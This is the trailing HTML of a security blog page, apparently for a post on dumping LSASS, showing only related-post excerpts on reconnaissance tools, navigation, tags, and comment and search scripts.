col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/subdomain-enumeration-methods/"><div class="card-body"> <em class="small" data-ts="1669842000" data-df="ll" > Dec 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Subdomain Enumeration Methods</h3><div class="text-muted small"><p> One of the first things to do in the discovery phase is to collect as many systems and IP addresses as possible without touching them. First of all, we need to find domains and subdomains. In this ...</p></div></div></a></div><div class="card"> <a href="/posts/asset-discovery-for-target/"><div class="card-body"> <em class="small" data-ts="1669928400" data-df="ll" > Dec 2, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Asset Discovery for Target</h3><div class="text-muted small"><p> Finding Netblock Addres From Company Name You can find NetblockTool on Github. #NetblockTool #Simple run. Get results from Google dorking and ARIN database: python3 NetblockTool.py Company #Inclu...</p></div></div></a></div><div class="card"> <a href="/posts/recon-ng-tutorials/"><div class="card-body"> <em class="small" data-ts="1670014800" data-df="ll" > Dec 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Recon-ng Tutorials for Enumeration Targets</h3><div class="text-muted small"><p> Recon-ng Basics Firstly we need to create a workspaces related to the target organization. It will gather our research and findings under these workspaces. workspaces list workspaces create examp...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/collecting-target-email-address/" class="btn btn-outline-primary" prompt="Older"><p>Collecting Target Email Addresses</p></a> <a href="/posts/certified-red-team-professional-CRTP-review/" class="btn btn-outline-primary" prompt="Newer"><p>Certified Red Team Professional (CRTP) - How to Pass</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/dumping-lsass-without-mimikatz/'; this.page.identifier = '/posts/dumping-lsass-without-mimikatz/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
